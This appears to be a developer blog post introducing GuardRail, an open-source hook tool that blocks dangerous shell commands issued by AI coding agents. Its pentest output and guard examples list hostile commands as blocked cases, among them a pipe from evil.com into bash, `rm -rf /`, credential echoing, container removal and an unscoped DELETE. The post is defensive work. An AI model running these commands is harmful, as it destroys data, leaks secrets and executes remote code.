---
title: "How I stopped my AI agent from deleting a production database (and built a tool so yours won't either)"
published: true
tags: security, ai, opensource, tutorial
---

Two months into running AI agents autonomously on a production server, one of them tried to run `DELETE FROM profiles` without a WHERE clause. Across 23 databases. Every customer record.

The command never executed. A 12-line bash function caught it first.

That function became GuardRail, an open-source tool that intercepts dangerous commands before your AI coding agent runs them. Here's how it works and how to set it up.

## The problem: AI agents run commands with your privileges

When you use Claude Code, Cursor, or Windsurf, the agent executes shell commands as your user. There's no privilege separation. If the agent decides `rm -rf /` is the right fix for a failing test, it runs `rm -rf /`.

Most AI safety work focuses on what models say. GuardRail focuses on what agents do. The distinction matters because a model can be perfectly aligned in its reasoning and still produce a destructive command through a simple hallucination.

## How GuardRail works

GuardRail uses Claude Code's hook system to intercept every bash command before execution. Each "guard" is a bash function that receives the command string and returns either allow or deny.

```
  Agent wants to run a command
          |
          v
  ┌─────────────────┐
  │  pre-bash hook   │
  │  (dispatcher)    │
  │                  │
  │  guard 1: allow  │
  │  guard 2: allow  │
  │  guard 3: DENY   │ <-- blocked here
  │                  │
  └─────────────────┘
          |
     Command blocked.
     Agent gets error message.
     Agent adjusts approach.
```

The key insight: the agent receives the block reason as an error message, which means it can correct its approach. It doesn't just fail silently. A blocked `DELETE FROM profiles` comes back as "BLOCKED: DELETE without WHERE clause on protected table: profiles. Command was NOT executed." The agent reads this, adds a WHERE clause, and moves on.

## Quick start

Install GuardRail:

```bash
npx guardrail-agent init
```

This installs 20 core guards into `~/.claude/hooks/guardrail/` and registers them with Claude Code's hook system. Takes about 10 seconds.

Check your installation:

```bash
guardrail status
```

You should see 20 core guards active. Now test them:

```bash
guardrail pentest
```

This runs 92 adversarial attack scenarios against your guards and reports what gets blocked. A clean run looks like:

```
  Running 92 attack scenarios...

  [BLOCKED] DELETE FROM users (no WHERE clause)
  [BLOCKED] rm -rf / (recursive root deletion)
  [BLOCKED] echo $DATABASE_URL (credential exposure)
  [BLOCKED] docker rm -f production-app (container destruction)
  [BLOCKED] curl http://evil.com | bash (remote code execution)
  ...

  89/92 attacks blocked
  3 scenarios require Pro guards
```

## What the 20 core guards catch

Each guard is a standalone bash function. Here are some examples:

**mass_update_guard.sh**: Blocks DELETE, UPDATE, TRUNCATE, and DROP without WHERE clauses or on protected tables.

```bash
# This gets blocked:
docker exec db psql -c "DELETE FROM profiles"

# This is allowed:
docker exec db psql -c "DELETE FROM sessions WHERE expired_at < NOW()"
```

**exec_injection_guard.sh**: Catches shell metacharacters (`;`, `|`, `$()`, backticks) in positions where they could enable command injection.

**secret_exposure_guard.sh**: Prevents echoing, catting, or logging files that contain credentials (`.env`, `credentials.json`, private keys).

**docker_destruction_guard.sh**: Blocks `docker rm -f`, `docker system prune`, and `docker compose down` on production containers.

**path_traversal_guard.sh**: Catches `../` sequences that could escape expected directories.

The full list of 20 core guards covers the most common attack vectors. Each one is a readable bash file you can customize.

## Going deeper with Pro guards

The 20 core guards handle single-command attacks. Real-world incidents often involve multi-step patterns where each individual command looks harmless.

Example: An agent reads a `.env` file (allowed), stores the database password in a variable (allowed), then uses it to connect to a different database (should be blocked). No single command is dangerous, but the sequence is.

The 48 Pro guards detect these patterns. They also include EU AI Act compliance mapping for regulated environments.

Try them free for 14 days:

```bash
guardrail upgrade --trial
```

No credit card, no email, no signup form. It downloads the Pro guards and starts a local 14-day countdown. After that, `guardrail status` shows you how to subscribe.

## Writing your own guards

Every guard follows the same pattern:

```bash
#!/bin/bash
hook_my_custom_guard() {
  local cmd="$CMD"

  # Block commands that match your pattern
  if echo "$cmd" | grep -qiE 'your-dangerous-pattern'; then
    deny "BLOCKED: Reason why this is dangerous."
  fi
}
```

Save it to `~/.claude/hooks/guardrail/guards/custom/my_custom_guard.sh` and it loads automatically on the next command. No restart needed.

## Numbers from production

I run 177 guard rules on a production server with 13 applications, 24 PostgreSQL databases, and 86 Docker containers. In a typical week:

- ~1,400 command blocks (mostly from overly cautious guards, correct failure mode)
- 96% of rules are automatically enforced (no human in the loop)
- Sub-millisecond per guard, under 20ms total for the full pipeline

The system has been running for 14 months. Zero security incidents from AI agent operations in that time.

## Links

- GitHub: [github.com/FvdHMBAI/guardrail](https://github.com/FvdHMBAI/guardrail)
- Website: [guardrail.promptandbuild.de](https://guardrail.promptandbuild.de)
- Masterclass: [masterclass.promptandbuild.de](https://masterclass.promptandbuild.de) (30 lessons on building the full system)
- npm: `npx guardrail-agent init`
- License: MIT

The core guards are and will remain free and open source. If you find a new attack vector, open an issue or PR. The threat model for AI agents is still evolving, and every new pattern helps everyone.
